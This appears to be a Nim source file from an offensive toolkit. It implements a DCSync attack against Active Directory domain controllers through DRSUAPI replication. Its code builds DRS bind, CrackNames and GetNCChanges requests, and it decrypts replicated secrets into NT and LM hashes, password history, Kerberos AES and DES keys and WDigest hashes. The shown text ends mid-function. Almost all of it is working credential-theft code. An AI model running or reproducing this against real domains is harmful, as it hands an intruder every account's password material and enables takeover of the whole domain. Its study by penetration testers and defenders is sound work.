import std/[asyncdispatch, md5, strutils, tables]
import ../smb/client as smb
import ../dcerpc/client as rpc
import ../ldap/client as ldap
import ../kerberos/gssapi as krb

type DesKeySchedule {.importc: "DES_key_schedule", header: "<openssl/des.h>".} = object
proc DES_set_key_unchecked(key: pointer; schedule: ptr DesKeySchedule)
    {.cdecl, importc, header: "<openssl/des.h>".}
proc DES_ecb_encrypt(inp, outp: pointer; schedule: ptr DesKeySchedule; enc: cint)
    {.cdecl, importc, header: "<openssl/des.h>".}
const DES_DECRYPT = 0.cint

proc fromUtf16Le(s: string): string =
  var i = 0
  while i + 1 < s.len:
    let cp = uint32(ord(s[i])) or (uint32(ord(s[i + 1])) shl 8)
    i += 2
    if cp < 0x80:
      result.add char(cp)
    elif cp < 0x800:
      result.add char(0xC0 or (cp shr 6))
      result.add char(0x80 or (cp and 0x3F))
    else:
      result.add char(0xE0 or (cp shr 12))
      result.add char(0x80 or ((cp shr 6) and 0x3F))
      result.add char(0x80 or (cp and 0x3F))

const
  DrsUuidBytes* = @[
    byte 0x35, 0x42, 0x51, 0xe3, 0x06, 0x4b, 0xd1, 0x11,
    0xab, 0x04, 0x00, 0xc0, 0x4f, 0xc2, 0xdc, 0xd2
  ]
  NtdsApiClientGuid = [
    byte 0x1a, 0x20, 0x4d, 0xe2, 0xd6, 0x4f, 0xd1, 0x11,
    0xa3, 0xda, 0x00, 0x00, 0xf8, 0x75, 0xae, 0x0d
  ]
  AttIdUnicodePwd*        = 0x9005A'u32
  AttIdNtHistory*         = 0x90059'u32
  AttIdLmHistory*         = 0x90060'u32
  AttIdObjectSid*         = 0x90092'u32
  AttIdSamName*           = 0x900DD'u32
  AttIdUserCtrl*          = 0x90008'u32
  AttIdSupplementalCreds* = 0x9007D'u32

  LmHashPlaceholder* = "aad3b435b51404eeaad3b435b51404ee"

  DrsExtFlags = 0x05c08000'u32
  DrsSyncFlags    = 0x00000010'u32 or 0x00000020'u32 or 0x00000040'u32
  DrsFullSyncFlags = 0x00000002'u32 or 0x00000010'u32 or 0x00000020'u32 or 0x00000040'u32
  ExopReplObj     = 0x00000006'u32
  ExopReplSecrets = 0x00000007'u32
  PrefixTableElements = [byte 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x14, 0x01, 0x04]
  PartialAttrIds = [
    0x00000290'u32,
    0x000000DD'u32,
    0x0000005A'u32,
    0x00000037'u32,
    0x0000005E'u32,
    0x000000A0'u32,
    0x0000007D'u32,
    0x00000092'u32,
    0x00000060'u32,
    0x00000008'u32
  ]

type
  KerberosKey* = object
    keyType*: uint32
    keyData*: string
    iterations*: uint32

  DcSyncAccount* = object
    username*: string
    domain*: string
    rid*: uint32
    domainSid*: string
    ntHash*: string
    lmHash*: string
    ntHistory*: seq[string]
    lmHistory*: seq[string]
    kerberosKeys*: seq[KerberosKey]
    kerberosOldKeys*: seq[KerberosKey]
    kerberosSalt*: string
    kerberosIterations*: uint32
    wdigestHashes*: seq[string]
    ntlmStrongNtowf*: string

  DcSyncResult* = object
    host*: string
    port*: int
    username*: string
    domain*: string
    authenticated*: bool
    accounts*: seq[DcSyncAccount]
    success*: bool
    message*: string
    error*: string

type Cursor = object
  buf: string
  pos: int

proc cu(data: string): Cursor = Cursor(buf: data, pos: 0)
proc ok(c: Cursor; n: int): bool = c.pos + n <= c.buf.len
proc remaining(c: Cursor): int = c.buf.len - c.pos

proc readU16(c: var Cursor): uint16 =
  if not c.ok(2): return 0
  result = uint16(ord(c.buf[c.pos])) or (uint16(ord(c.buf[c.pos + 1])) shl 8)
  c.pos += 2

proc readU32(c: var Cursor): uint32 =
  if not c.ok(4): return 0
  result = uint32(ord(c.buf[c.pos])) or
    (uint32(ord(c.buf[c.pos + 1])) shl 8) or
    (uint32(ord(c.buf[c.pos + 2])) shl 16) or
    (uint32(ord(c.buf[c.pos + 3])) shl 24)
  c.pos += 4

proc readU64(c: var Cursor): uint64 =
  if not c.ok(8): return 0
  for i in 0 .. 7: result = result or (uint64(ord(c.buf[c.pos + i])) shl (i * 8))
  c.pos += 8

proc readBytes(c: var Cursor; n: int): string =
  if not c.ok(n): c.pos = c.buf.len; return ""
  result = c.buf[c.pos ..< c.pos + n]
  c.pos += n

proc skip(c: var Cursor; n: int) =
  c.pos = min(c.pos + n, c.buf.len)

proc align4(c: var Cursor) =
  let r = c.pos mod 4
  if r != 0: c.skip(4 - r)

proc addU16Le(s: var string; v: uint16) =
  s.add char(v and 0xff); s.add char((v shr 8) and 0xff)

proc addU32Le(s: var string; v: uint32) =
  s.add char(v and 0xff)
  s.add char((v shr 8) and 0xff)
  s.add char((v shr 16) and 0xff)
  s.add char((v shr 24) and 0xff)

proc addU64Le(s: var string; v: uint64) =
  for i in 0 .. 7: s.add char((v shr (i * 8)) and 0xff)

proc addPad(s: var string; n: int) =
  for _ in 0 ..< n:
    s.add char(0)

proc align8(s: var string) =
  let r = s.len mod 8
  if r != 0:
    s.addPad(8 - r)

proc readU32Le(data: string; offset: int): uint32 =
  if offset + 4 > data.len: return 0
  uint32(ord(data[offset])) or (uint32(ord(data[offset + 1])) shl 8) or
    (uint32(ord(data[offset + 2])) shl 16) or (uint32(ord(data[offset + 3])) shl 24)

proc decryptDrsHash*(sessionKey: string; rid: uint32; encrypted: string): string =
  if encrypted.len < 20 or sessionKey.len == 0:
    return ""
  let salt = encrypted[0 ..< 16]
  let digest = toMD5(sessionKey & salt)
  var key = newString(16)
  for i in 0 .. 15: key[i] = char(digest[i])
  var state = smb.rc4Init(key)
  let plain = smb.rc4Process(state, encrypted[16 .. ^1])
  if plain.len < 20:
    return ""
  let desLayer = plain[4 ..< 20]

  proc transformKey(k7: string): string =
    if k7.len < 7:
      return ""
    var key8 = newString(8)
    let k = k7
    key8[0] = char(((ord(k[0]) shr 1) shl 1) and 0xfe)
    key8[1] = char(((((ord(k[0]) and 0x01) shl 6) or (ord(k[1]) shr 2)) shl 1) and 0xfe)
    key8[2] = char(((((ord(k[1]) and 0x03) shl 5) or (ord(k[2]) shr 3)) shl 1) and 0xfe)
    key8[3] = char(((((ord(k[2]) and 0x07) shl 4) or (ord(k[3]) shr 4)) shl 1) and 0xfe)
    key8[4] = char(((((ord(k[3]) and 0x0f) shl 3) or (ord(k[4]) shr 5)) shl 1) and 0xfe)
    key8[5] = char(((((ord(k[4]) and 0x1f) shl 2) or (ord(k[5]) shr 6)) shl 1) and 0xfe)
    key8[6] = char(((((ord(k[5]) and 0x3f) shl 1) or (ord(k[6]) shr 7)) shl 1) and 0xfe)
    key8[7] = char(((ord(k[6]) and 0x7f) shl 1) and 0xfe)
    key8

  var ridBuf = newString(4)
  ridBuf[0] = char(rid and 0xff)
  ridBuf[1] = char((rid shr 8) and 0xff)
  ridBuf[2] = char((rid shr 16) and 0xff)
  ridBuf[3] = char((rid shr 24) and 0xff)
  let k1 = transformKey(ridBuf & ridBuf[0 ..< 3])
  let k2 = transformKey(ridBuf[3 .. 3] & ridBuf[0 .. 2] & ridBuf[3 .. 3] & ridBuf[0 .. 1])
  if k1.len != 8 or k2.len != 8:
    return ""
  var sched1, sched2: DesKeySchedule
  var out1 = newString(8)
  var out2 = newString(8)
  DES_set_key_unchecked(unsafeAddr k1[0], addr sched1)
  DES_set_key_unchecked(unsafeAddr k2[0], addr sched2)
  DES_ecb_encrypt(unsafeAddr desLayer[0], addr out1[0], addr sched1, DES_DECRYPT)
  DES_ecb_encrypt(unsafeAddr desLayer[8], addr out2[0], addr sched2, DES_DECRYPT)
  result = out1 & out2

proc toHexStr*(data: string): string =
  for c in data:
    result.add toHex(ord(c), 2).toLowerAscii()

proc kerberosTypeName*(t: uint32): string =
  case t
  of 1:          "des-cbc-crc"
  of 3:          "des-cbc-md5"
  of 17:         "aes128-cts-hmac-sha1-96"
  of 18:         "aes256-cts-hmac-sha1-96"
  of 0xffffff74'u32: "rc4_hmac"
  else:          "etype-" & $t

proc decryptSupplementalCredentials*(sessionKey, encrypted: string): string =
  if encrypted.len < 20 or sessionKey.len == 0:
    return ""
  let salt = encrypted[0 ..< 16]
  let digest = toMD5(sessionKey & salt)
  var key = newString(16)
  for i in 0 .. 15: key[i] = char(digest[i])
  var state = smb.rc4Init(key)
  let plain = smb.rc4Process(state, encrypted[16 .. ^1])
  if plain.len <= 4:
    return ""
  return plain[4 .. ^1]

proc fromHexPairs(s: string): string =
  var i = 0
  while i + 1 < s.len:
    result.add char(parseHexInt(s[i .. i+1]))
    i += 2

proc fromUtf16LeStr(s: string): string =
  var i = 0
  while i + 1 < s.len:
    let lo = uint16(ord(s[i])) or (uint16(ord(s[i+1])) shl 8)
    i += 2
    if lo < 0x80:
      result.add char(lo)
    elif lo < 0x800:
      result.add char(0xC0 or (lo shr 6))
      result.add char(0x80 or (lo and 0x3F))
    else:
      result.add char(0xE0 or (lo shr 12))
      result.add char(0x80 or ((lo shr 6) and 0x3F))
      result.add char(0x80 or (lo and 0x3F))

proc readU16Le(s: string; off: int): uint16 =
  if off + 1 >= s.len: return 0
  uint16(ord(s[off])) or (uint16(ord(s[off+1])) shl 8)

proc readU32LeD(s: string; off: int): uint32 =
  if off + 3 >= s.len: return 0
  uint32(ord(s[off])) or (uint32(ord(s[off+1])) shl 8) or
  (uint32(ord(s[off+2])) shl 16) or (uint32(ord(s[off+3])) shl 24)

proc parseSupplementalCredentials*(plain: string; acct: var DcSyncAccount) =
  if plain.len < 112: return
  let sig = uint16(ord(plain[108])) or (uint16(ord(plain[109])) shl 8)
  if sig != 0x50: return
  let propCount = int(uint16(ord(plain[110])) or (uint16(ord(plain[111])) shl 8))
  var off = 112
  for _ in 0 ..< propCount:
    if off + 6 > plain.len: break
    let nameLen = int(uint16(ord(plain[off])) or (uint16(ord(plain[off+1])) shl 8))
    let valLen  = int(uint16(ord(plain[off+2])) or (uint16(ord(plain[off+3])) shl 8))
    off += 6
    if off + nameLen + valLen > plain.len: break
    let propName = fromUtf16LeStr(plain[off ..< off + nameLen])
    let propVal  = plain[off + nameLen ..< off + nameLen + valLen]
    off += nameLen + valLen

    if propName == "Primary:Kerberos-Newer-Keys":
      let buf = fromHexPairs(propVal)
      if buf.len < 24: continue
      let credCount    = int(readU16Le(buf, 4))
      let saltLen      = int(readU16Le(buf, 12))
      let saltOff      = int(readU32LeD(buf, 16))
      let defIter      = readU32LeD(buf, 20)
      acct.kerberosIterations = if defIter > 0: defIter else: 4096'u32
      if saltOff > 0 and saltOff + saltLen <= buf.len:
        acct.kerberosSalt = fromUtf16LeStr(buf[saltOff ..< saltOff + saltLen])
      var koff = 24
      for _ in 0 ..< credCount:
        if koff + 24 > buf.len: break
        let iterCount = readU32LeD(buf, koff + 8)
        let keyType   = readU32LeD(buf, koff + 12)
        let keyLen    = int(readU32LeD(buf, koff + 16))
        let keyOff    = int(readU32LeD(buf, koff + 20))
        koff += 24
        if keyOff + keyLen > buf.len: continue
        acct.kerberosKeys.add KerberosKey(
          keyType: keyType,
          keyData: buf[keyOff ..< keyOff + keyLen],
          iterations: if iterCount > 0: iterCount else: acct.kerberosIterations)

    elif propName == "Primary:Kerberos":
      let buf = fromHexPairs(propVal)
      if buf.len < 16: continue
      let credCount = int(readU16Le(buf, 4))
      let saltLen   = int(readU16Le(buf, 8))
      let saltOff   = int(readU32LeD(buf, 12))
      if acct.kerberosSalt.len == 0 and saltOff > 0 and saltOff + saltLen <= buf.len:
        acct.kerberosSalt = fromUtf16LeStr(buf[saltOff ..< saltOff + saltLen])
      var koff = 16
      for _ in 0 ..< credCount:
        if koff + 20 > buf.len: break
        let keyType = readU32LeD(buf, koff + 8)
        let keyLen  = int(readU32LeD(buf, koff + 12))
        let keyOff  = int(readU32LeD(buf, koff + 16))
        koff += 20
        if keyOff + keyLen > buf.len: continue
        acct.kerberosOldKeys.add KerberosKey(
          keyType: keyType,
          keyData: buf[keyOff ..< keyOff + keyLen],
          iterations: 4096'u32)

    elif propName == "Primary:WDigest":
      let buf = fromHexPairs(propVal)
      if buf.len < 4: continue
      let count = int(ord(buf[1]))
      var woff = 4
      for _ in 0 ..< count:
        if woff + 16 > buf.len: break
        acct.wdigestHashes.add toHexStr(buf[woff ..< woff + 16])
        woff += 16

    elif propName == "Primary:NTLM-Strong-NTOWF":
      let buf = fromHexPairs(propVal)
      if buf.len >= 16:
        acct.ntlmStrongNtowf = toHexStr(buf[0 ..< 16])

proc parseKerberosKeys*(plain: string): seq[KerberosKey] =
  var tmp = DcSyncAccount()
  parseSupplementalCredentials(plain, tmp)
  result = tmp.kerberosKeys

proc dcsyncDebug(label, data: string) =
  when defined(dcsyncDebug):
    echo "[dcsync-debug] ", label, " len=", data.len, " hex=", toHexStr(data)

proc ridFromSid(sidBytes: string): uint32 =
  if sidBytes.len < 8: return 0
  let subCount = int(ord(sidBytes[1]))
  let off = 8 + (subCount - 1) * 4
  if off + 4 > sidBytes.len: return 0
  readU32Le(sidBytes, off)

proc sidBytesToString(raw: string): string =
  if raw.len < 8: return ""
  let revision = ord(raw[0])
  let subCount = ord(raw[1])
  var authority: int64 = 0
  for i in 0 ..< 6:
    authority = (authority shl 8) or int64(ord(raw[2 + i]))
  result = "S-" & $revision & "-" & $authority
  for i in 0 ..< subCount:
    let off = 8 + i * 4
    if off + 4 > raw.len: return ""
    var v: uint32 = 0
    for j in 0 ..< 4:
      v = v or (uint32(ord(raw[off + j])) shl (j * 8))
    result.add "-" & $v

proc sidFromString(sid: string): string =
  let parts = sid.split('-')
  if parts.len < 3 or parts[0] != "S":
    return ""
  try:
    result.add char(parseInt(parts[1]))
    result.add char(parts.len - 3)
    let authority = uint64(parseBiggestUInt(parts[2]))
    for shift in countdown(40, 0, 8):
      result.add char((authority shr shift) and 0xff)
    for part in parts[3 .. ^1]:
      var value = uint32(parseBiggestUInt(part))
      for shift in countup(0, 24, 8):
        result.add char((value shr shift) and 0xff)
  except ValueError:
    result = ""

proc normalizeTargetName(target: string): string =
  result = target.strip()
  let slash = result.rfind('\\')
  if slash >= 0 and slash + 1 < result.len:
    result = result[slash + 1 .. ^1]
  let at = result.find('@')
  if at > 0:
    result = result[0 ..< at]

proc nt4DomainName*(domain: string): string =
  let clean = domain.strip()
  if clean.len == 0:
    return ""
  let first = clean.split('.')[0].strip()
  if first.len == 0:
    return ""
  result = first.toUpperAscii()

proc asNt4AccountName(domain, target: string): string =
  let trimmed = target.strip()
  if trimmed.len == 0:
    return ""
  if "\\" in trimmed:
    return trimmed
  let nt4 = nt4DomainName(domain)
  if nt4.len == 0:
    return trimmed
  nt4 & "\\" & normalizeTargetName(trimmed)

proc ldapEscapeFilter(value: string): string =
  for c in value:
    case c
    of '*': result.add "\\2a"
    of '(' : result.add "\\28"
    of ')' : result.add "\\29"
    of '\\': result.add "\\5c"
    of '\0': result.add "\\00"
    else: result.add c

proc buildDsNameFromDn(targetDn: string): string =
  let utf = smb.toUtf16Le(targetDn)
  let nameChars = uint32((utf.len div 2) + 1)
  let structLen = uint32(60 + utf.len + 2)
  result.addU32Le nameChars
  result.addU32Le structLen
  result.addU32Le 0'u32
  for _ in 0 .. 15: result.add char(0)
  for _ in 0 .. 27: result.add char(0)
  result.addU32Le nameChars
  result.add utf
  result.addU16Le 0'u16

proc buildDsNameFromSid(sidBytes: string): string =
  let sidLen = min(sidBytes.len, 28)
  result.addU32Le 1'u32
  result.addU32Le 62'u32
  result.addU32Le uint32(sidLen)
  for _ in 0 .. 15: result.add char(0)
  result.add sidBytes[0 ..< sidLen]
  for _ in sidLen ..< 28: result.add char(0)
  result.addU32Le 0'u32
  result.addU16Le 0'u16

proc buildDsNameFromGuid(guidBytes: string): string =
  result.addU32Le 1'u32
  result.addU32Le 62'u32
  result.addU32Le 0'u32
  if guidBytes.len >= 16:
    result.add guidBytes[0 ..< 16]
  else:
    for _ in 0 .. 15: result.add char(0)
  for _ in 0 .. 27: result.add char(0)
  result.addU32Le 0'u32
  result.addU16Le 0'u16

proc guidBytesFromString(guidText: string): string =
  var hex = ""
  for c in guidText:
    if c notin {'{', '}', '-'}:
      hex.add c
  if hex.len != 32:
    return ""
  try:
    let raw = hex.toLowerAscii()
    let parts = [
      parseHexInt(raw[6 .. 7]), parseHexInt(raw[4 .. 5]),
      parseHexInt(raw[2 .. 3]), parseHexInt(raw[0 .. 1]),
      parseHexInt(raw[10 .. 11]), parseHexInt(raw[8 .. 9]),
      parseHexInt(raw[14 .. 15]), parseHexInt(raw[12 .. 13]),
      parseHexInt(raw[16 .. 17]), parseHexInt(raw[18 .. 19]),
      parseHexInt(raw[20 .. 21]), parseHexInt(raw[22 .. 23]),
      parseHexInt(raw[24 .. 25]), parseHexInt(raw[26 .. 27]),
      parseHexInt(raw[28 .. 29]), parseHexInt(raw[30 .. 31])
    ]
    for b in parts:
      result.add char(b)
  except ValueError:
    result = ""

proc enumerateAllUsers(host: string; timeoutMs: int; username, password,
                       ntlmHash, domain, baseDn: string;
                       kerberos = false): Future[seq[tuple[samName: string; sid: string]]] {.async.} =
  let r = await ldap.probeLdap(host, 389, timeoutMs, username, password, domain,
    ntlmHash, ldap.LdapQueryOptions(
      customBase: baseDn,
      customFilter: "(objectClass=user)",
      customAttrs: @["sAMAccountName", "objectSid"]), kerberos = kerberos)
  for entry in r.custom:
    let sam = if entry.attrs.hasKey("sAMAccountName") and entry.attrs["sAMAccountName"].len > 0:
                entry.attrs["sAMAccountName"][0]
              else: ""
    let sid = if entry.attrs.hasKey("objectSid") and entry.attrs["objectSid"].len > 0:
                entry.attrs["objectSid"][0]
              else: ""
    if sam.len > 0 and sid.len > 0:
      result.add (samName: sam, sid: sid)

proc discoverReplicaGuid(host: string; timeoutMs: int; username, password,
                         ntlmHash, domain: string;
                         kerberos = false): Future[string] {.async.} =
  let root = await ldap.probeLdap(host, 389, timeoutMs, username, password, domain,
    ntlmHash, ldap.LdapQueryOptions(rootDse: true), kerberos = kerberos)
  if not root.authenticated or root.serverName.len == 0:
    return ""
  let ntdsDn = "CN=NTDS Settings," & root.serverName
  let custom = await ldap.probeLdap(host, 389, timeoutMs, username, password, domain,
    ntlmHash, ldap.LdapQueryOptions(customBase: ntdsDn,
      customFilter: "(objectClass=*)", customAttrs: @["objectGUID"], limit: 1),
    kerberos = kerberos)
  if custom.custom.len == 0:
    return ""
  let attrs = custom.custom[0].attrs
  if attrs.hasKey("objectGUID") and attrs["objectGUID"].len > 0:
    return attrs["objectGUID"][0]
  return ""

proc resolveTargetSid(host: string; timeoutMs: int; username, password,
                      ntlmHash, domain, baseDn, targetDn, target: string;
                      kerberos = false): Future[string] {.async.} =
  if targetDn.len == 0:
    return ""
  let lookupFilter =
    if targetDn.contains("=") and targetDn.contains(","):
      "(objectClass=*)"
    else:
      let hint = ldapEscapeFilter(normalizeTargetName(target))
      "(|(sAMAccountName=" & hint & ")(sAMAccountName=" & hint & "$)(cn=" & hint & "))"
  let searchBase =
    if targetDn.contains("=") and targetDn.contains(","): targetDn
    elif baseDn.len > 0: baseDn
    else: targetDn
  let custom = await ldap.probeLdap(host, 389, timeoutMs, username, password, domain,
    ntlmHash, ldap.LdapQueryOptions(customBase: searchBase,
      customFilter: lookupFilter, customAttrs: @["objectSid"], limit: 1),
    kerberos = kerberos)
  if custom.custom.len == 0:
    return ""
  let attrs = custom.custom[0].attrs
  if attrs.hasKey("objectSid") and attrs["objectSid"].len > 0:
    return attrs["objectSid"][0]
  return ""

proc buildDrsBindRequest*(replEpoch = 0'u32): string =
  result.addU32Le 0x00003da1'u32
  for b in NtdsApiClientGuid:
    result.add char(b)
  result.addU32Le 0x0000d391'u32
  result.addU32Le 52'u32
  result.addU32Le 52'u32
  result.addU32Le DrsExtFlags
  for _ in 0 .. 15:
    result.add char(0)
  result.addU32Le 0'u32
  result.addU32Le replEpoch
  result.addU32Le 0'u32
  for _ in 0 .. 15:
    result.add char(0)
  result.addU32Le 0xffffffff'u32

proc parseDrsBindResponse*(stub: string): tuple[hDrs: string; ok: bool] =
  if stub.len < 28:
    return ("", false)
  var off = 4
  if readU32Le(stub, 0) != 0 and stub.len >= 12:
    let maxCount = int(readU32Le(stub, off))
    off += 8 + maxCount
    while off mod 4 != 0:
      inc off
  if off + 24 <= stub.len:
    let retCode = readU32Le(stub, off + 20)
    result.ok = (retCode == 0)
    result.hDrs = stub[off ..< off + 20]
  else:
    let retCode = readU32Le(stub, stub.len - 4)
    result.ok = (retCode == 0)
    if stub.len >= 24:
      result.hDrs = stub[stub.len - 24 ..< stub.len - 4]

proc buildDrsCrackNamesRequest*(hDrs: string; accountName: string;
                                formatOffered = 3'u32; formatDesired = 1'u32): string =
  result.add hDrs
  result.addU32Le 1'u32
  result.addU32Le 1'u32
  result.addU32Le 0'u32
  result.addU32Le 0'u32
  result.addU32Le 0'u32
  result.addU32Le formatOffered
  result.addU32Le formatDesired
  result.addU32Le 1'u32
  result.addU32Le 0x00020000'u32
  result.addU32Le 1'u32
  result.addU32Le 0x00020004'u32
  let name = if accountName.endsWith("\0"): accountName else: accountName & "\0"
  let utf = smb.toUtf16Le(name)
  let charCount = uint32(utf.len div 2)
  result.addU32Le charCount
  result.addU32Le 0'u32
  result.addU32Le charCount
  result.add utf
  while result.len mod 4 != 0: result.add char(0)

proc parseDrsCrackNamesResponse*(stub: string): string =
  if stub.len < 20: return ""
  var c = cu(stub)
  let version = c.readU32
  let disc = c.readU32
  if version != 1 or disc != 1: return ""
  let pResultRef = c.readU32
  if pResultRef == 0: return ""
  let cItems = c.readU32
  let rItemsRef = c.readU32
  if rItemsRef == 0 or cItems == 0: return ""
  let maxCount = c.readU32
  if maxCount == 0: return ""
  let status = c.readU32
  if status != 0: return ""
  let pDomainRef = c.readU32
  let pNameRef = c.readU32
  if pNameRef == 0: return ""
  if pDomainRef != 0:
    let dMax = c.readU32
    let dOff = c.readU32
    let dCount = c.readU32
    c.skip(int(dCount) * 2)
    c.align4()
  if c.remaining < 12: return ""
  let nMax = c.readU32
  let nOff = c.readU32
  let nCount = c.readU32
  let readChars = if nCount > 0: nCount - 1 else: 0
  if not c.ok(int(nCount) * 2): return ""
  let utf16 = c.readBytes(int(readChars) * 2)
  c.skip(2)
  c.align4()
  result = fromUtf16Le(utf16)

proc buildDrsDomainControllerInfoRequest*(hDrs: string; domain: string;
                                          infoLevel = 2'u32): string =
  result.add hDrs
  result.addU32Le 1'u32
  result.addU32Le 1'u32
  result.addU32Le 0x00003001'u32
  result.addU32Le infoLevel
  let fqdn = if domain.endsWith("\0"): domain else: domain & "\0"
  let utf = smb.toUtf16Le(fqdn)
  let chars = uint32(utf.len div 2)
  result.addU32Le chars
  result.addU32Le 0'u32
  result.addU32Le chars
  result.add utf
  while result.len mod 4 != 0:
    result.add char(0)

proc parseDrsDomainControllerInfoGuid*(stub: string): string =
  if stub.len < 24:
    return ""
  let outVersion = readU32Le(stub, 0)
  let unionTag = readU32Le(stub, 4)
  if outVersion != 2 or unionTag != 2:
    return ""
  let cItems = readU32Le(stub, 8)
  let rItemsRef = readU32Le(stub, 12)
  if cItems == 0 or rItemsRef == 0:
    return ""
  let arrayOffset = 16
  if stub.len < arrayOffset + 4 + 104:
    return ""
  let maxCount = readU32Le(stub, arrayOffset)
  if maxCount == 0:
    return ""
  let itemOffset = arrayOffset + 4
  let guidOffset = itemOffset + 88
  if stub.len < guidOffset + 16:
    return ""
  return stub[guidOffset ..< guidOffset + 16]

proc skipDsnameDeferred(c: var Cursor) =
  if c.remaining < 8: return
  let maxCount = c.readU32
  let structLen = c.readU32
  if structLen > 4:
    c.skip(int(structLen) - 4)
  c.align4()

proc skipUpToDateVector(c: var Cursor) =
  if c.remaining < 16: return
  let maxCount = c.readU32
  c.skip(4)
  c.skip(4)
  let cCursors = c.readU32
  c.skip(int(maxCount) * 24)

proc skipPrefixTableDeferred(c: var Cursor; prefixCount: uint32) =
  let maxCount = c.readU32
  var pArrayRefs: seq[tuple[present: bool; byteCount: uint32]]
  for _ in 0'u32 ..< maxCount:
    c.skip(4)
    let byteCount = c.readU32
    let ref32 = c.readU32
    pArrayRefs.add((ref32 != 0, byteCount))
  for entry in pArrayRefs:
    if entry.present:
      let arrayMax = c.readU32
      c.skip(int(arrayMax))
      c.align4()

type AttrRaw = object
  attrTyp: uint32
  values: seq[string]

proc parseReplEntInfList(c: var Cursor; sessionKey: string): seq[DcSyncAccount] =
  while c.remaining >= 32:
    let pNextRef = c.readU32
    let pNameRef = c.readU32
    let ulFlags = c.readU32
    let attrCount = c.readU32
    let pAttrRef = c.readU32
    c.skip(4)
    c.skip(4)
    c.skip(4)

    var sidBytes = ""
    var attrs: seq[AttrRaw]

    if pNameRef != 0:
      if c.remaining < 8: break
      let maxCount = c.readU32
      let structLen = c.readU32
      if structLen < 4: break
      let sidLen = c.readU32
      c.skip(16)
      let rawSid = c.readBytes(28)
      if sidLen > 0 and sidLen <= 28:
        sidBytes = rawSid[0 ..< int(sidLen)]
      let nameLen = c.readU32
      c.skip(int(maxCount) * 2)
      c.align4()

    if pAttrRef != 0 and attrCount > 0:
      let maxCount = c.readU32
      var attrList: seq[tuple[typ: uint32; valCount: uint32; ref32: uint32]]
      for _ in 0'u32 ..< maxCount:
        let typ = c.readU32
        let valCount = c.readU32
        let ref32 = c.readU32
        attrList.add((typ, valCount, ref32))

      for entry in attrList:
        if entry.ref32 == 0 or entry.valCount == 0: continue
        let arrMax = c.readU32
        var attrRaw = AttrRaw(attrTyp: entry.typ)
        var valRefs: seq[tuple[len: uint32; ref32: uint32]]
        for _ in 0'u32 ..< arrMax:
          let vLen = c.readU32
          let vRef = c.readU32
          valRefs.add((vLen, vRef))
        for vEntry in valRefs:
          if vEntry.ref32 == 0: continue
          let vMax = c.readU32
          let valueBytes = c.readBytes(int(vMax))
          c.align4()
          attrRaw.values.add(valueBytes)
        attrs.add(attrRaw)

    var acct = DcSyncAccount()
    let rid = ridFromSid(sidBytes)
    acct.rid = rid
    let accountSidStr = sidBytesToString(sidBytes)
    if accountSidStr.len > 0:
      let sidParts = accountSidStr.split('-')
      if sidParts.len > 4:
        acct.domainSid = sidParts[0 ..< sidParts.len - 1].join("-")

    for attr in attrs:
      case attr.attrTyp
      of AttIdSamName:
        if attr.values.len > 0:
          acct.username = fromUtf16Le(attr.values[0])
      of AttIdUnicodePwd:
        if attr.values.len > 0 and attr.values[0].len >= 20:
          if rid > 0 and sessionKey.len > 0:
            acct.ntHash = decryptDrsHash(sessionKey, rid, attr.values[0])
      of AttIdNtHistory:
        for v in attr.values:
          if v.len >= 20:
            if rid > 0 and sessionKey.len > 0:
              acct.ntHistory.add(decryptDrsHash(sessionKey, rid, v))
      of AttIdLmHistory:
        for v in attr.values:
          if v.len >= 20:
            if rid > 0 and sessionKey.len > 0:
              acct.lmHistory.add(decryptDrsHash(sessionKey, rid, v))
      of AttIdObjectSid:
        if attr.values.len > 0 and acct.rid == 0:
          acct.rid = ridFromSid(attr.values[0])
      of AttIdSupplementalCreds:
        if attr.values.len > 0 and sessionKey.len > 0:
          let plain = decryptSupplementalCredentials(sessionKey, attr.values[0])
          if plain.len > 0:
            parseSupplementalCredentials(plain, acct)
      else:
        discard

    when defined(dcsyncDebug):
      echo "[dcsync-debug] parsed repl object rid=", acct.rid,
        " user=", acct.username, " attrs=", attrs.len,
        " ntHashLen=", acct.ntHash.len
      for attr in attrs:
        let firstLen = if attr.values.len > 0: attr.values[0].len else: 0
        echo "[dcsync-debug] attr 0x", attr.attrTyp.toHex(8),
          " values=", attr.values.len, " firstLen=", firstLen

    if acct.username.len > 0 or acct.rid > 0:
      result.add(acct)

    if pNextRef == 0:
      break

proc buildDrsGetNcChangesRequest*(hDrs: string; targetDn: string;
                                  sidBytes = ""; guidBytes = "";
                                  replicaGuid = ""; exop = ExopReplObj): string =
  result.add hDrs
  result.addU32Le 8'u32
  result.addU32Le 8'u32
  result.align8()
  if replicaGuid.len >= 16:
    result.add replicaGuid[0 ..< 16]
    result.add replicaGuid[0 ..< 16]
  else:
    for _ in 0 .. 15: result.add char(0)
    for _ in 0 .. 15: result.add char(0)
  result.addU32Le 0x00002001'u32
  result.align8()
  result.addU64Le 0'u64
  result.addU64Le 0'u64
  result.addU64Le 0'u64
  result.addU32Le 0'u32
  let syncFlags = if exop == 0'u32: DrsFullSyncFlags else: DrsSyncFlags
  result.addU32Le syncFlags
  result.addU32Le 1'u32
  result.addU32Le 0'u32
  result.addU32Le exop
  result.align8()
  result.addU64Le 0'u64
  result.addU32Le 0x00002002'u32
  result.addU32Le 0'u32
  result.addU32Le 1'u32
  result.addU32Le 0x00002003'u32
  if guidBytes.len > 0:
    result.add buildDsNameFromGuid(guidBytes)
  elif sidBytes.len > 0:
    result.add buildDsNameFromSid(sidBytes)
  else:
    result.add buildDsNameFromDn(targetDn)
  while result.len mod 4 != 0:
    result.add char(0)

  result.addU32Le uint32(PartialAttrIds.len)
  result.addU32Le 1'u32
  result.addU32Le 0'u32
  result.addU32Le uint32(PartialAttrIds.len)
  for attrId in PartialAttrIds:
    result.addU32Le attrId

  result.addU32Le 1'u32
  result.addU32Le 0'u32
  result.addU32Le uint32(PrefixTableElements.len)
  result.addU32Le 0x00002006'u32
  result.addU32Le uint32(PrefixTableElements.len)
  for b in PrefixTableElements:
    result.add char(b)

proc parseDrsGetNcChangesResponse*(stub: string; sessionKey: string): seq[DcSyncAccount] =
  if stub.len < 128: return

  var c = cu(stub)
  let pdwOutVersion = c.readU32
  let unionDisc = c.readU32
  if pdwOutVersion != 6 or unionDisc != 6: return

  c.skip(16)
  c.skip(16)
  let pNcRef = c.readU32
  c.skip(24)
  c.skip(24)
  let pUpToDateRef = c.readU32
  c.skip(4)
  let prefixCount = c.readU32
  let pPrefixRef = c.readU32
  c.skip(4)
  let cNumObjects = c.readU32
  c.skip(4)
  let pObjectsRef = c.readU32
  c.skip(4)
